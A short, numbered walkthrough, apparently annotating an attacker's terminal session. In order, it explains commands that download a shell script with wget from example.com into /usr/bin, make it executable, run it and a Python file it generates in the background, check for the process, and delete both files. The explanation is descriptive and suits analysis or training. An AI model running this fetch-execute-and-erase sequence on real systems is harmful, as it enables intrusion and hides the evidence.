0
The attacker uses `wget` to **download a shell script** from `http://example.com` saving it as `/usr/bin/example.sh`

1
The attacker then **changes directories** to `/usr/bin` and makes the script **executable** with `chmod +x example.sh`

2
The attacker then executes the script with `./example.sh` and **appends the output of the shell script to a new python file named `example_output.py`**

3
The attacker then **executes the generated python script** `example_output.py` through the `exec` command or in the background`python3 example_output.py &`

4
The attacker then **lists all processes** and **filters the output** for `example_output.py` with `ps -ajfx | grep example_output.py`

5-6
The attacker then **removes the shell script** `example.sh` and the python script `example_output.py` with `rm example.sh` and `rm example_output.py`

7
Finally, the attacker **exits the terminal** with `exit`
